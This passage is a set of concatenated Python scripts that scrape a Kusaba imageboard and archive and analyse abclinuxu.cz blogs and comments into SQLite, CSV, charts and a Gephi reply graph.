		fh_css   = open(RESOURCES_DIR + "/style.css")
		fh_n_css = open(board_dir + "/style.css", "wt")
		fh_n_css.write(fh_css.read())
		fh_css.close()
		fh_n_css.close()

		if verbose:
			write(" .. database")

		# save to sqlite database
		saveThreadToDatabase(db, thread.thread_id, posts)

		if verbose:
			writeln(" .. done.")

	if verbose:
		write("Generating html index .. ")

	# generate board index
	fh = open(board_dir + "index.html", "wt")
	fh.write(boardToHTML(db, board_name))
	fh.close()

	if verbose:
		writeln("done.")

	db.close()


if __name__ == '__main__':
	main()
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__version = "0.5.1"
__date    = "21.06.2013"
# KusabaAPI by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Sublime Text 2 editor.
#= Imports =====================================================================
from mfn import html, web



#= Functions & objects =========================================================
class Post:
	def __init__(self, author = None, email = None, subject = "", text = "", post_id = None, files = []):
		self.author      = author
		self.email       = email
		self.subject     = subject
		self.text        = text
		self.time        = ""

		self.post_id     = post_id
		self.files       = files # array of dictionaries; {file:url, thumb:url}

	def __str__(self):
		return str(
			"Author:  " + str(self.author) + "\n" +
			"Email:   " + str(self.email) + "\n" +
			"ID:      " + str(self.post_id) + "\n" +
			"Time:    " + self.time + "\n" +
			"Subject: " + self.subject + "\n" +
			"Files:   " + str(self.files) + "\n" +
			"Text:    " + self.text + "\n\n"
		) 



class Thread:
	def __init__(self, chan_url, thread_url):
		self.chan_url = chan_url
		self.thread_url = thread_url
		self.url = chan_url + thread_url

		self.ops_name  = None
		self.thread_id = int(thread_url.split(".")[0].split("/")[-1])
		self.first_message = None

	def __str__(self):
		return str(
			"ID: " + str(self.thread_id) + "\n" +
			"OPs name: " + self.ops_name + "\n" +
			"Message:" + self.first_message + "\n\n"
		)

	def getPosts(self):
		"Returns all Post objects from thread."

		dom = html.parseString(web.getPage(self.url))

		posts = []
		for p in dom.find("div", {"class" : "post"}):
			post = Post()

			# parse poster's name / email
			post.author = p.find("span", {"class" : "postername"})[0]
			if len(post.author.find("a")) > 0:
				post.author = post.author.find("a")[0]
				post.email  = post.author.params["href"].replace("mailto:", "")
			post.author = post.author.getContent()

			# subject
			subject = p.find("span", {"class" : "subject"})
			if len(subject) > 0:
				post.subject = subject[0].getContent()

			# attachment
			post.files = [] # dont ask, this is some weird memory - alocating shit issue
			attachment = p.find("p", {"class" : "file_size"})
			if len(attachment) > 0:
				attachment = attachment[0].find("a")
				thumb = p.find("img", {"class" : "thumb"})
				thumb = thumb[0].params["src"] if len(thumb) > 0 else ""


				if len(attachment) > 0:
					post.files.append({
							"file" : attachment[0].params["href"],
							"thumb" : thumb
						}
					)


			#attachments - yeah, multiattachment posts, lovely
			# attachments = []
			attachments = p.find("span", {"class" : "multithumbfirst"})
			attachments.extend(p.find("span", {"class" : "multithumb"}))

			thumbs = p.find("img", {"class" : "multithumbfirst"})
			thumbs.extend(p.find("img", {"class" : "multithumb"}))
			thumbs = map(lambda x: x.params["src"], thumbs)

			tmp_files = []
			for attachment in attachments:
				attachment = attachment.find("a")

				if len(attachment) > 0:
					tmp_files.append(attachment[0].params["href"])
			for f, t in zip(tmp_files, thumbs):
				post.files.append({"file" : f, "thumb" : t})


			# time
			time = p.find("div", {"class" : "post_header"})[0]
			time = filter(lambda x: not x.isTag() and str(x).strip() != "", time.childs)
			post.time = str(time[0]).strip()

			post.text = p.find("p", {"class" : "message"})[0].getContent()
			post.post_id = p.params["id"]

			posts.append(post)

		return posts



class Kusaba:
	def __init__(self, url):
		self.url = url

	def getBoardList(self):
		"Returns boardlist as dictionary board:url_short."
		dom = html.parseString(web.getPage(self.url + "/menu.php"))

		# all /links/
		board_list = {}
		for link in dom.find("a"):
			if "href" in link.params and "class" in link.params:
				href = link.params["href"]

				# extract short url
				if href.lower().startswith("http"):
					href = href[:-1] if href.endswith("/") else href
					href = "/" + href.split("/")[-1] + "/"

				if href.startswith("/") and href.endswith("/"):
					board_list[link.getContent().strip()] = href

		return board_list

	def getThreadList(self, board_url):
		"Returns list of all threads (Thread object) in given board."

		dom = html.parseString(web.getPage(self.url + board_url))

		# parse how many pages is in thread
		paging = dom.find("div", {"id" : "paging"})
		if len(paging) != 0:
			paging = paging[0].find("a")[-1].getContent()
			paging = int(paging)
		else:
			paging = 0

		threads = []
		for p in range(paging + 1):
			url = self.url + board_url if p == 0 else self.url + board_url + str(p) + ".html"
			dom = html.parseString(web.getPage(url))

			for t in dom.find("div", {"class" : "thread"}):
				thread_url = t.find("span", {"class" : "reflink"})[0].find("a")[0].params["href"].split("#")[0]

				# really really big thread tends to have different syntax of link
				if "read.php" in thread_url:
					board_part  = ""
					thread_part = ""
					for i in thread_url.replace("&amp;", "&").replace("?", "&").split("&"):
						if "b=" in i:
							board_part  = i.split("=")[-1]
						if "t=" in i:
							thread_part = i.split("=")[-1]
					thread_url = "/" + board_part + "/res/" + thread_part + ".html"

				thread = Thread(self.url, thread_url)
				thread.first_message = t.find("p", {"class" : "message"})[0].getContent()

				# parse op's name
				thread.ops_name = t.find("span", {"class" : "postername"})[0]
				n = thread.ops_name.find("a")
				thread.ops_name = n[0].getContent() if len(n) > 0 else thread.ops_name.getContent()

				threads.append(thread)

		return threads



#= Main program ================================================================
if __name__ == '__main__':
	print "Kusaba API v" + __version + " (" + __date + ") by Bystroushaak (bystrousak@kitakitsune.org)"
	k = Kusaba("http://7chan.org")
	print "\n\n".join(map(lambda x: str(x), k.getThreadList("/pr/")[0].getPosts()))
#! /usr/bin/env python
# -*- coding: utf-8 -*-
import os
import csv
import sys
import time
import os.path
import shutil
import argparse
import datetime
from collections import defaultdict

import matplotlib.pyplot as plt

from tqdm import tqdm
from sqlitedict import SqliteDict


class BlogAnalyzer(object):
    def __init__(self, only_for_year=False):
        self.length_of_blogs_in_years = defaultdict(int)
        self.length_of_blogs_in_months = defaultdict(int)

        self.number_of_blogs_in_years = defaultdict(int)
        self.number_of_blogs_in_months = defaultdict(int)

        self.number_of_comments_in_years = defaultdict(int)
        self.number_of_comments_in_months = defaultdict(int)

        self.active_registered_people_in_years = defaultdict(set)
        self.active_registered_people_in_months = defaultdict(set)

        self.active_unregistered_people_in_years = defaultdict(set)
        self.active_unregistered_people_in_months = defaultdict(set)

        self.number_of_registered_people_in_years = defaultdict(int)
        self.number_of_registered_people_in_months = defaultdict(int)

        self.number_of_unregistered_people_in_years = defaultdict(int)
        self.number_of_unregistered_people_in_months = defaultdict(int)

        self.read_counter_in_years = defaultdict(int)
        self.read_counter_in_months = defaultdict(int)

        self.only_for_year = only_for_year

    def timestamp_to_yyyy(self, timestamp):
        return datetime.datetime.utcfromtimestamp(timestamp).strftime('%Y')

    def timestamp_to_yyyy_mm(self, timestamp):
        return datetime.datetime.utcfromtimestamp(timestamp).strftime('%Y-%m')

    def analyze(self, blog):
        blog_yyyy = self.timestamp_to_yyyy(blog.created_ts)
        blog_yyyy_mm = self.timestamp_to_yyyy_mm(blog.created_ts)

        this_year_month = time.strftime('%Y-%m')
        if blog_yyyy_mm == this_year_month:
            return

        self.length_of_blogs_in_years[blog_yyyy] += len(blog.text)
        self.length_of_blogs_in_months[blog_yyyy_mm] += len(blog.text)

        self.number_of_blogs_in_years[blog_yyyy] += 1
        self.number_of_blogs_in_months[blog_yyyy_mm] += 1

        self.number_of_comments_in_years[blog_yyyy] += len(blog.comments)
        self.number_of_comments_in_months[blog_yyyy_mm] += len(blog.comments)

        self.read_counter_in_years[blog_yyyy] += blog.readed or 0
        self.read_counter_in_months[blog_yyyy_mm] += blog.readed or 0

        for comment in blog.comments:
            comment_yyyy = self.timestamp_to_yyyy(blog.created_ts)
            comment_yyyy_mm = self.timestamp_to_yyyy_mm(blog.created_ts)
            username = comment.username

            if comment.registered:
                self.active_registered_people_in_years[comment_yyyy].add(username)
                self.active_registered_people_in_months[comment_yyyy_mm].add(username)
            else:
                self.active_unregistered_people_in_years[comment_yyyy].add(username)
                self.active_unregistered_people_in_months[comment_yyyy_mm].add(username)

        if self.only_for_year:
            self._trim_older_than_one_year()

    def _trim_older_than_one_year(self):
        month_datasets = [
            val for key, val in self.__dict__.items()
            if key.endswith('months') and isinstance(val, defaultdict)
        ]

        years_datasets = [
            val for key, val in self.__dict__.items()
            if key.endswith('years') and isinstance(val, defaultdict)
        ]

        year = str(int(time.strftime('%Y')) - 1)
        for dataset in years_datasets:
            for key in list(dataset.keys()):
                if key < year:
                    del dataset[key]

        year_month = '%s-%s' % (int(time.strftime('%Y')) - 1, time.strftime('%m'))
        this_year_month = time.strftime('%Y-%m')
        for dataset in month_datasets:
            for key in list(dataset.keys()):
                if key < year_month or key == this_year_month:
                    del dataset[key]

    def dump_counter_into_csv(self, counter, csv_name):
        with open(csv_name, 'wb') as csvfile:
            writer = csv.writer(
                csvfile,
                delimiter=';',
                quotechar='"',
                quoting=csv.QUOTE_MINIMAL
            )
            for year, count in sorted(counter.items()):
                writer.writerow([year, count])

    def counter_into_png(self, dataset_name, counter, axis, png_name):
        x_points = []
        y_points = []
        for x, y in sorted(counter.items()):
            x_points.append(x)
            y_points.append(y)

        fig, ax = plt.subplots(1, 1)
        plt.title(axis["description"].decode("utf-8"))
        plt.xlabel(axis["x"].decode("utf-8"))
        plt.ylabel(axis["y"].decode("utf-8"))
        plt.xticks(rotation=60)
        if self.only_for_year:
            plt.ylim(ymin=0, ymax=max(y_points) + (max(y_points) / 20.0))
        plt.plot(x_points, y_points)
        fig.tight_layout()

        modulo = 1 if self.only_for_year else 6

        if "months" in dataset_name:
            for cnt, label in enumerate(ax.get_xticklabels()):
                if cnt % modulo != 0:
                    label.set_visible(False)

        plt.savefig(png_name)
        plt.clf()

    def generate_report(self, out_dir):
        self.number_of_registered_people_in_years = {
            key: len(people)
            for key, people in self.active_registered_people_in_years.iteritems()
        }
        self.number_of_registered_people_in_months = {
            key: len(people)
            for key, people in self.active_registered_people_in_months.iteritems()
        }
        self.number_of_unregistered_people_in_years = {
            key: len(people)
            for key, people in self.active_unregistered_people_in_years.iteritems()
        }
        self.number_of_unregistered_people_in_months = {
            key: len(people)
            for key, people in self.active_unregistered_people_in_months.iteritems()
        }

        datasets = {
            "length_of_blogs_in_years": {
                "dataset": self.length_of_blogs_in_years,
                "description": "Délka blogů v průběhu let (po letech)",
                "x": "Roky",
                "y": "Délka blogů"
            },
            "length_of_blogs_in_months": {
                "dataset": self.length_of_blogs_in_months,
                "description": "Délka blogů v průběhu let (po měsících)",
                "x": "Měsíce",
                "y": "Délka blogů"
            },
            "number_of_blogs_in_years": {
                "dataset": self.number_of_blogs_in_years,
                "description": "Počty blogů (po letech)",
                "x": "Roky",
                "y": "Počet blogů"
            },
            "number_of_blogs_in_months": {
                "dataset": self.number_of_blogs_in_months,
                "description": "Počty blogů (po měsících)",
                "x": "Měsíce",
                "y": "Počet blogů"
            },
            "number_of_comments_in_years": {
                "dataset": self.number_of_comments_in_years,
                "description": "Počty komentářů (po letech)",
                "x": "Roky",
                "y": "Počet komentářů"
            },
            "number_of_comments_in_months": {
                "dataset": self.number_of_comments_in_months,
                "description": "Počty komentářů (po měsících)",
                "x": "Měsíce",
                "y": "Počet komentářů"
            },
            "number_of_registered_people_in_years": {
                "dataset": self.number_of_registered_people_in_years,
                "description": "Aktivní registrovaní komentátoři (po letech)",
                "x": "Roky",
                "y": "Počet komentátorů"
            },
            "number_of_registered_people_in_months": {
                "dataset": self.number_of_registered_people_in_months,
                "description": "Aktivní registrovaní komentátoři (po měsících)",
                "x": "Měsíce",
                "y": "Počet komentátorů"
            },
            "number_of_unregistered_people_in_years": {
                "dataset": self.number_of_unregistered_people_in_years,
                "description": "Aktivní NEregistrovaní komentátoři (po letech)",
                "x": "Roky",
                "y": "Počet komentátorů"
            },
            "number_of_unregistered_people_in_months": {
                "dataset": self.number_of_unregistered_people_in_months,
                "description": "Aktivní NEregistrovaní komentátoři (po měsících)",
                "x": "Měsíce",
                "y": "Počet komentátorů"
            },
            "read_counter_in_years": {
                "dataset": self.read_counter_in_years,
                "description": "Celkové počty přečtení (po rocích)",
                "x": "Roky",
                "y": "Počty přečtení blogů"
            },
            "read_counter_in_months": {
                "dataset": self.read_counter_in_months,
                "description": "Celkové počty přečtení (po měsících)",
                "x": "Měsíce",
                "y": "Počty přečtení blogů"
            }
        }

        for dataset_name, data in datasets.iteritems():
            self.dump_counter_into_csv(
                data["dataset"],
                os.path.join(out_dir, dataset_name + ".csv")
            )
            self.counter_into_png(
                dataset_name,
                data["dataset"],
                data,
                os.path.join(out_dir, dataset_name + ".png")
            )


def generate_report(blogtree_path, out_dir, only_for_year):
    analyzer = BlogAnalyzer(only_for_year)

    first_day_of_this_month = time.strptime(
        time.strftime("%Y-%m-01 %H:%M:00"),
        "%Y-%m-%d %H:%M:%S"
    )
    first_day_of_this_month_ts = time.strftime("%s", first_day_of_this_month)

    with SqliteDict(blogtree_path) as serialized:
        for blog in tqdm(serialized.itervalues(), total=len(serialized)):
            if blog.created_ts < first_day_of_this_month_ts:
                analyzer.analyze(blog)

    analyzer.generate_report(out_dir)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "blogtree",
        metavar="BLOGTREE.sqlite",
        help="Path to the blogtree .sqlite file."
    )
    parser.add_argument(
        "-o",
        "--output",
        default="datasets",
        help="Name of the output directory. Default `%(default)s.`",
    )
    parser.add_argument(
        "-y",
        "--year",
        action="store_true",
        help="Only for last year."
    )

    args = parser.parse_args()

    if not os.path.exists(args.blogtree):
        sys.stderr.write("`%s` not found.\n" % args.blogtree)
        sys.exit(1)

    if os.path.exists(args.output):
        shutil.rmtree(args.output)

    os.mkdir(args.output)

    generate_report(args.blogtree, args.output, args.year)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import os.path
import sqlite3
import argparse

from tqdm import tqdm
from sqlitedict import SqliteDict


def create_tables(cursor):
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS `edges` (
            `source` INTEGER,
            `target` INTEGER
        );
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS `nodes` (
            `id` INTEGER,
            `label` TEXT,
            PRIMARY KEY(`id`)
        )
    """)


def username_from_comment(comment):
    return comment.username if comment.registered else comment.username + " (unregisted)"


def process_blogpost(blog, users, talks_to):
    for comment in blog.comments:
        username = username_from_comment(comment)
        users.add(username)

        if comment.response_to:
            talks_to[username] = username_from_comment(comment.response_to)


def generate_gephi_sqlite(blogtree_path, output_path):
    conn = sqlite3.connect(output_path)
    conn.text_factory = str
    cursor = conn.cursor()

    create_tables(cursor)
    conn.commit()

    users = set()
    talks_to = {}

    with SqliteDict(blogtree_path) as serialized:
        for blog in tqdm(serialized.itervalues(), total=len(serialized)):
            process_blogpost(blog, users, talks_to)
            conn.commit()

    user_to_id = {}
    for cnt, username in enumerate(list(users)):
        user_to_id[username] = cnt

    for user, uid in tqdm(user_to_id.iteritems(), total=len(user_to_id)):
        cursor.execute(
            "INSERT INTO nodes VALUES (?, ?)",
            (uid, user)
        )

    conn.commit()

    for who, to in tqdm(talks_to.iteritems(), total=len(talks_to)):
        cursor.execute(
            "INSERT INTO edges VALUES (?, ?)",
            (user_to_id[who], user_to_id[to])
        )

    conn.commit()
    conn.close()


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "blogtree",
        metavar="BLOGTREE.sqlite",
        help="Path to the blogtree .sqlite file."
    )
    parser.add_argument(
        "-o",
        "--output",
        default="gephi.sqlite",
        help="Name of the output file. Default `%(default)s.`",
    )

    args = parser.parse_args()

    if not os.path.exists(args.blogtree):
        sys.stderr.write("`%s` not found.\n" % args.blogtree)
        sys.exit(1)

    generate_gephi_sqlite(args.blogtree, args.output)
#! /usr/bin/env python3
import re
import sys
import json
import gzip
from collections import defaultdict

import dhtmlparser


class User:
    PLUS_REGEXP = re.compile(r"\D\+1\D")
    MINUS_REGEXP = re.compile(r"\D\-1\D")

    def __init__(self, username=None):
        self.username = username
        self.counter = 0
        self.url_register = set()

    def _apply_blacklist(self, text):
        dom = dhtmlparser.parseString(text)

        blacklist = dom.find(
            "",
            fn=lambda x: x.getTagName() in [
                "i",
                "a",
                "bq",
                "pre",
                "italic",
                "blockquote",
            ]
        )

        for el in blacklist:
            el.replaceWith(dhtmlparser.parseString(""))

        return str(dom)

    def _decide(self, comment):
        text = self._apply_blacklist(comment["text"])

        if User.PLUS_REGEXP.search(text):
            return 1
        # elif User.MINUS_REGEXP.search(text):
        #     return -1

        return 0

    def process(self, comment_pair):
        val = self._decide(comment_pair["comment"])

        if val == 0:
            return

        self.counter += val
        self.username = comment_pair["response_to"]["username"]
        self.url_register.add(comment_pair["comment"]["url"])


def count_comments(comments):
    registered = defaultdict(User)
    unregistered = defaultdict(User)

    comment_n = len(comments)
    for cnt, comment_pair in enumerate(comments):
        print("%d/%d" % (cnt, comment_n), file=sys.stderr)

        comment = comment_pair["response_to"]
        if not comment:
            continue

        username = comment["username"].lower()
        if comment["registered"]:
            registered[username].process(comment_pair)
        else:
            unregistered[username].process(comment_pair)

    return registered, unregistered


def print_stats(dataset, title, registered=True, print_url=False):
    print("<h2>%s</h2>" % title)
    print("<p>")
    print("<ol>")

    for nick, user in sorted(dataset.items(), key=lambda x: x[-1].counter, reverse=True):
        if not user.username:
            user.username = nick

        if user.counter == 0:
            continue

        if registered:
            print(
                "<li><a href=\"http://abclinuxu.cz/lide/%s\">%s</a> (%s)" %
                (user.username, user.username, user.counter)
            )
        else:
            print(
                "<li><strong>%s</strong> (%s)" %
                (user.username, user.counter)
            )

        if print_url:
            for url in user.url_register:
                print("<ul><li><a href=\"%s\">%s</a></li></ul>" % (url, url))

        print("</li>")

    print("</ol>")
    print("</p>")


if __name__ == '__main__':
    with gzip.open("sign_comments.json.gz", "rt") as f:
        data = json.load(f)

    registered, unregistered = count_comments(data)

    print_stats(registered, "Registrovaní uživatelé")
    print_stats(unregistered, "Neregistrovaní uživatelé", False)
    print("<h1>Kontrolní výpis</h1>")
    print_stats(registered, "Registrovaní uživatelé", print_url=True)
    print_stats(unregistered, "Neregistrovaní uživatelé", False, True)

    # print(registered["gtz"].url_register)#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from zconf import get_zeo_key


# Variables ===================================================================
# Functions & classes =========================================================
def pick_unregistered(comments):
    return [
        not comment.registered
        for comment in comments
    ]


def i_was_the_poster(comment):
    if not comment.registered or not comment.username:
        return False

    return comment.username.lower() == "bystroushaak"


def people_i_talked_with(blogposts):
    for blog in blogposts.values():
        for comment in blog.comments:
            if i_was_the_poster(comment):
                previous = pick_unregistered(comment.response_to)
                responses = pick_unregistered(comment.responses)

                if responses:
                    yield responses

                if previous:
                    yield [previous]


# Main program ================================================================
if __name__ == '__main__':
    blogposts = get_zeo_key("blogposts")

    for cmnt in people_i_talked_with(blogposts):
        print cmnt.username, cmnt.url
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import re
import sys
import json

from zconf import get_zeo_key


# Variables ===================================================================
PLUS_REGEXP = re.compile(r"\+[0-9]")
MINUS_REGEXP = re.compile(r"\-[0-9]")


# Functions & classes =========================================================
def is_plus_comment(comment):
    return bool(PLUS_REGEXP.search(comment.text))


def is_minus_comment(comment):
    return bool(MINUS_REGEXP.search(comment.text))


def pick_plus_comments(blogposts):
    for blog in blogposts.values():
        for comment in blog.comments:
            if is_plus_comment(comment) or is_minus_comment(comment):
                yield comment


def serialize_comment(comment):
    def to_dict(comment):
        return {
            "url": comment.url,
            "text": comment.text,
            "timestamp": comment.timestamp,
            "username": comment.username,
            "registered": comment.registered,
        }

    response_to = to_dict(comment.response_to) if comment.response_to else None

    return {
        "comment": to_dict(comment),
        "response_to": response_to,
    }


# Main program ================================================================
if __name__ == '__main__':
    blogposts = get_zeo_key("blogposts")

    result = [
        serialize_comment(plus_comment)
        for plus_comment in pick_plus_comments(blogposts)
    ]

    json.dump(
        obj=result,
        fp=sys.stdout,
        indent=4,
        separators=(',', ': '),
    )
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
import argparse

from tqdm import tqdm
from sqlitedict import SqliteDict


def pick_correct_poster(comment, username, registered):
    if registered and not comment.registered:
        return False

    if not comment.username:
        return False

    return comment.username.lower() == username


def grep_in_blog(blog, username, registered, strings, case_sensitive):
    for comment in blog.comments:
        if not pick_correct_poster(comment, username, registered):
            continue

        if case_sensitive:
            blog_text = comment.text
        else:
            blog_text = comment.text.lower()

        def maybe_lower(s):
            if case_sensitive:
                return s
            
            return s.lower()

        if all(maybe_lower(string) in blog_text for string in strings):
            print comment.url
            print comment.text
            print
            print


def grep_in_blogtree(blogtree_path, username, registered, string, case_sensitive):
    with SqliteDict(blogtree_path) as serialized:
        for blog in tqdm(serialized.itervalues(), total=len(serialized)):
            grep_in_blog(blog, username, registered, string, case_sensitive)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-b",
        "--blogtree",
        required=True,
        metavar="BLOGTREE.sqlite",
        help="Path to the blogtree .sqlite file."
    )
    parser.add_argument(
        "-c",
        "--case-sensitive",
        action="store_true",
        help="Grep `string` case sensitively."
    )
    parser.add_argument(
        "-r",
        "--registered",
        action="store_true",
        help="User must be registered."
    )
    parser.add_argument(
        "-u",
        "--username",
        required=True,
        help="Username to grep."
    )
    parser.add_argument(
        "strings",
        nargs="+",
        help="String to grep in blogtree."
    )
    args = parser.parse_args()

    grep_in_blogtree(
        args.blogtree,
        args.username,
        args.registered,
        args.strings,
        args.case_sensitive,
    )
#! /usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import os.path
import sqlite3
import argparse

from tqdm import tqdm
from sqlitedict import SqliteDict


def create_tables(cursor):
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS `Blogs` (
            `url` TEXT UNIQUE,
            `id` INTEGER UNIQUE,
            `title` TEXT,
            `perex` TEXT,
            `content` TEXT,
            `rating` INTEGER,
            `rating_base` INTEGER,
            `has_tux` INTEGER DEFAULT 0,
            `number_of_reads` INTEGER DEFAULT 0,
            `downloaded_ts` INTEGER,
            `created_ts` INTEGER,
            `last_modified_ts` INTEGER,
            PRIMARY KEY(`url`,`id`)
        );
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS "Comments" (
            `id` INTEGER PRIMARY KEY AUTOINCREMENT,
            `url` TEXT,
            `content` TEXT,
            `timestamp` INTEGER,
            `username` TEXT,
            `user_registered` INTEGER,
            `censored` INTEGER
        );
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS "Tags" (
            `id` TEXT UNIQUE,
            `tag` TEXT,
            PRIMARY KEY(`id`)
        );
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS `blog_has_comment` (
            `blog_id` INTEGER,
            `comment_id` INTEGER
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS "blog_has_tag" (
            `blog_id` INTEGER,
            `tag_id` INTEGER
        );
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS `comment_has_responses` (
            `comment_id` INTEGER,
            `response_id` INTEGER
        );
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS `comment_responds_to` (
            `comment_id` INTEGER,
            `parent_id` INTEGER DEFAULT 0
        );
    """)


def serialize_tags(cursor, blog):
    for tag in blog.tags:
        cursor.execute(
            "INSERT OR IGNORE INTO Tags VALUES (?, ?)",
            (tag.norm, tag.tag)
        )
        cursor.execute(
            "INSERT INTO blog_has_tag VALUES (?, ?)",
            (blog.uid, tag.norm)
        )


def _comment_str_id_to_numeric(blog, comment):
    return blog.uid * 1000000 + int(comment.id)


def serialize_comments(cursor, blog):
    for comment in blog.comments:
        comment_id = _comment_str_id_to_numeric(blog, comment)
        cursor.execute(
            """INSERT OR IGNORE INTO Comments VALUES (?, ?, ?, ?, ?, ?, ?)""",
            (
                comment_id,
                comment.url,
                comment.text,
                comment.timestamp,
                comment.username,
                comment.registered,
                comment.censored,
            )
        )
        cursor.execute(
            "INSERT INTO blog_has_comment VALUES (?, ?)",
            (blog.uid, comment_id)
        )
        if comment.response_to:
            cursor.execute(
                "INSERT INTO comment_responds_to VALUES (?, ?)",
                (comment_id, _comment_str_id_to_numeric(blog, comment.response_to))
            )
        
        for response in comment.responses:
            cursor.execute(
                "INSERT OR IGNORE INTO comment_has_responses VALUES (?, ?)",
                (comment_id, _comment_str_id_to_numeric(blog, response))
            )


def serialize_blogpost(cursor, blog):
    cursor.execute(
        """INSERT INTO Blogs VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
        (
            blog.relative_url,
            blog.uid,
            blog.title,
            blog.intro,
            blog.text,
            blog.rating.rating if blog.rating else 0,
            blog.rating.base if blog.rating else 0,
            blog.has_tux,
            blog.readed,
            blog.object_ts,
            blog.created_ts,
            blog.last_modified_ts,
        )
    )

    serialize_tags(cursor, blog)
    serialize_comments(cursor, blog)


def convert_blogtree(blogtree_path, output_path):
    conn = sqlite3.connect(output_path)
    conn.text_factory = str
    cursor = conn.cursor()

    create_tables(cursor)
    conn.commit()

    with SqliteDict(blogtree_path) as serialized:
        for blog in tqdm(serialized.itervalues(), total=len(serialized)):
            serialize_blogpost(cursor, blog)
            conn.commit()
    
    conn.commit()


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "blogtree",
        metavar="BLOGTREE.sqlite",
        help="Path to the blogtree .sqlite file."
    )
    parser.add_argument(
        "-o",
        "--output",
        default="blogtree_clean.sqlite",
        help="Name of the output file. Default `%(default)s.`",
    )

    args = parser.parse_args()

    if not os.path.exists(args.blogtree):
        sys.stderr.write("`%s` not found.\n" % args.blogtree)
        sys.exit(1)

    convert_blogtree(args.blogtree, args.output)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
import sys
import time
import argparse
from Queue import Empty
from multiprocessing import Queue
from multiprocessing import Process

from retrying import retry
from sqlitedict import SqliteDict
from timeout_wrapper import timeout

from abclinuxuapi import iter_blogposts
from abclinuxuapi import first_blog_page
from abclinuxuapi import number_of_blog_pages

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class WorkerDone(object):
    pass


def sqlitedict_writer(db_path, no_blogs, number_of_downloaders, blog_queue):
    BREAK_AFTER = 300 / 5  # 300s / 5s timeout = 60 retries
    circuit_breaker = 0
    number_of_active_downloaders = number_of_downloaders

    with SqliteDict(db_path, autocommit=False) as blogpost_db:
        for cnt in xrange(100000000):
            try:
                blog = blog_queue.get(block=True, timeout=5)
                circuit_breaker = 0
            except Empty:
                circuit_breaker += 1
                if circuit_breaker >= BREAK_AFTER or number_of_active_downloaders <= 0:
                    break
                continue

            if number_of_active_downloaders <= 0:
                break

            if isinstance(blog, WorkerDone):
                number_of_active_downloaders -= 1
                continue

            blogpost_db[blog.url] = blog
            print cnt + 1, no_blogs, blog.title

            if (cnt % 5) == 0:
                blogpost_db.commit()

        blogpost_db.commit()


@retry(stop_max_attempt_number=5, wait_fixed=120000)  # wait 120s
@timeout(120)
def pull(blog):
    blog.pull()

    # don't save parsed HTML - this saves a LOT of space in database
    blog._dom = None
    blog._content_tag = None


def blog_downloader(in_queue, writer_queue):
    while True:
        try:
            blog = in_queue.get(block=True, timeout=5)
        except Empty:
            # wait for more urls
            time.sleep(1)
            continue

        if isinstance(blog, WorkerDone):
            writer_queue.put(WorkerDone())
            break

        try:
            pull(blog)
            writer_queue.put(blog)
        except Exception as e:
            print("Exception: %s on blog %s" % (str(e), blog.url))
            time.sleep(10)

            try:
                pull(blog)
                writer_queue.put(blog)
            except:
                print("Another exception: %s on blog %s, skipping.." % (str(e), blog.url))
                continue


def get_number_of_blogs():
    print "Estimating number of blogs..",

    def print_progress(n):
        sys.stdout.write(".")
        sys.stdout.flush()

    no_blogs = "/ ~%d" % (number_of_blog_pages(print_progress) * 25)

    print

    return no_blogs


def download_blogtree(db_path, everything=True, full_text=False, uniq=False,
                      number_of_downloaders=4):
    blog_getter = iter_blogposts if everything else first_blog_page

    with SqliteDict(db_path, autocommit=False) as blogpost_db:
        already_downloaded = set(blogpost_db.keys())

    no_blogs = get_number_of_blogs() if everything else ""

    empty_blog_queue = Queue()
    sqlite_writer_queue = Queue()
    writer = Process(
        target=sqlitedict_writer,
        args=(db_path, no_blogs, number_of_downloaders, sqlite_writer_queue)
    )
    writer.start()
    workers = [
        Process(
            target=blog_downloader,
            args=(empty_blog_queue, sqlite_writer_queue)
        )
        for _ in range(number_of_downloaders)
    ]
    for worker in workers:
        worker.start()

    for cnt, blog in enumerate(blog_getter()):
        if uniq and blog.url in already_downloaded:
            print "skipping", cnt + 1, blog.title
            continue

        empty_blog_queue.put(blog)

    # put signals for workers that job is done
    for _ in range(number_of_downloaders):
        empty_blog_queue.put(WorkerDone())

    # wait for workers
    for worker in workers:
        worker.join()

    # wait for writer
    writer.join()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="Download all published blogs on abclinuxu.cz."
    )
    parser.add_argument(
        "-a",
        "--all",
        action="store_true",
        help="Download whole blogarchive, not just the first page."
    )
    parser.add_argument(
        "-f",
        "--full",
        action="store_true",
        help="Download full texts of the blog and comments."
    )
    parser.add_argument(
        "-u",
        "--uniq",
        action="store_true",
        help="Skip already downloaded items."
    )
    parser.add_argument(
        "-w",
        "--workers",
        default=8,
        type=int,
        help="Number of workers. Default %(default)s."
    )
    parser.add_argument(
        "PATH",
        help="Path to the SQLite file where the results will be stored."
    )

    args = parser.parse_args()

    download_blogtree(
        db_path=args.PATH,
        everything=args.all,
        full_text=args.full,
